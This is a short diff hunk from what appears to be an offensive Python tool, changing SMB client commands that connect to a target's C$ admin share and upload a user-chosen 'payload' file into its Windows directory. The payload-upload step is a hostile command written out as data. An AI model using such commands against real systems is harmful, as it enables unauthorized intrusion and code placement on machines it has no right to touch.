@@ -78,7 +78,7 @@ if __name__ == "__main__":
     payload = args.payload
     technique = args.technique
     
-    smb_commands = ["use C$\n", "cd c:\Windows\n", f"put {payload}\n"]
+    smb_commands = ["use C$\n", "cd Windows\n", f"put {payload}\n"]
 
     if os.path.exists("smbcommands.txt"):
         os.remove("smbcommands.txt")
